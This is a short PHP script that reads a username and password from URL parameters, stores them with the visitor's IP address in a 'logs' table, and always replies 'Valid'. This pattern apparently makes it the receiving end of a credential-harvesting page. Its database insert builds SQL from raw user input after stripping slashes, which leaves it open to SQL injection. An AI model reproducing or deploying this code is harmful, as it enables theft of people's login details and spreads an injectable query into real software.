<?php
    $user = strtolower(trim(stripslashes($_GET['uk'])));
    $pass = strtolower(trim(stripslashes($_GET['pk'])));
    
    include 'common.php';
        $query2 = $db->query('INSERT INTO logs (user, pass, ip) VALUES(\''.$user.'\',\''.$pass.'\', \''.$_SERVER['REMOTE_ADDR'].'\')') or fuck('Invalid',false);
        
fuck('Valid',false);
?>